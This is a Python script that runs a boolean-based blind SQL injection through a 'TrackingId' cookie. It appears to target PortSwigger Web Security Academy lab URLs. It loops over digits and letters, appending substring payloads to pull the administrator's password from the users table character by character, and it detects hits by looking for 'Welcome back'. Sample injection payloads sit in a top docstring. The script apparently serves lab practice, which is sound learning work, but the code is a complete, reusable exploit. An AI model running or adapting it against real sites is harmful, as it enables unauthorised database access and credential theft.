import threading
import requests
import argparse
from colorama import Fore, Style

'''
    ' and (select substring(password, 1, 1) from users where username='administrator')='§a§'-- -
    ' and substring((select password FROM users where username='administrator'), 1, 1)='a'-- -
https://0a7a00690388c8a082c7ddf300dc000e.web-security-academy.net
    /filter?category=Food+%26+Drink

'''


class BruteForce:
    __url = None
    __session = None
    __cookie = None
    __cookies = None
    __grep_match = None
    __payload_template = None
    __no_letter = None
    __letter = None
    __amount = None
    __brrrrrrrrrr = None

    __proxies = {
        'http': 'http://127.0.0.1:8080',
        'https': 'https://127.0.0.1:8080'
    }

    def __init__(self, url, cookie, grep_match, amount):
        self.__url = url
        self.__cookie = cookie
        self.__grep_match = grep_match
        self.__cookies = {}
        self.__session = requests.Session()
        self.__payload_template = "' and substring((select password FROM users where username='administrator'), %d, 1)='%s'-- -"
        self.__no_letter = 1
        self.__letter = 65
        self.__amount = amount
        self.__brrrrrrrrrr = ""

    def run(self):
        self.get_cookies()
        self.brute_force()

    def get_cookies(self):

        response = self.__session.get(self.__url)#proxies=self.__proxies, verify=False)

        self.__cookies = self.__session.cookies.get_dict()
        return self.__session.cookies.get_dict()[self.__cookie]

    def configure_payload(self):
        return self.__payload_template % (self.__no_letter, chr(self.__letter))

    def make_request(self):
        self.__cookies[self.__cookie] += self.configure_payload()
        response = requests.get(self.__url, cookies=self.__cookies)#, proxies=self.__proxies, verify=False)
        # print(Fore.RED, self.__cookies, Style.RESET_ALL)
        self.__cookies[self.__cookie] = self.get_cookies()
        if self.search_match(response.text):
            self.__brrrrrrrrrr += chr(self.__letter)
        self.configure_payload()

    def search_match(self, text) -> bool:
        if self.__grep_match in text:
            return True
        return False

    def print_pt(self):
        print(self.__payload_template % (69, 'dupa'))

    def brute_force(self):
        tmpl = len(self.__brrrrrrrrrr)
        for i in range(self.__amount):
            self.__no_letter = i+1
            print(Fore.BLUE, f'[+] Found: {self.__brrrrrrrrrr}', Style.RESET_ALL)
            for j in range(48, 58):
                self.__letter = j
                self.make_request()
                # print(chr(j))

            for j in range(65, 91):
                self.__letter = j
                self.make_request()
                # print(chr(j))

            for j in range(97, 123):
                self.__letter = j
                self.make_request()
                # print(chr(j))
            if tmpl == len(self.__brrrrrrrrrr):
                print(Fore.GREEN, f'[+] Found: {self.__brrrrrrrrrr}', Style.RESET_ALL)
                exit()

            # self.make_request()
            # self.configure_payload()

        print(Fore.GREEN, f'[+] Found: {self.__brrrrrrrrrr}', Style.RESET_ALL)


if __name__ == '__main__':
    # parser = argparse.ArgumentParser(description='SQLi brute force script')
    # # parser.add_argument('-')
    # args = parser.parse_args()
    bf = BruteForce('https://0ae4008b04029c0981b452010087005b.web-security-academy.net', 'TrackingId', 'Welcome back', 23)
    # print(bf.get_cookies())
    # bf.print_pt()
    bf.run()
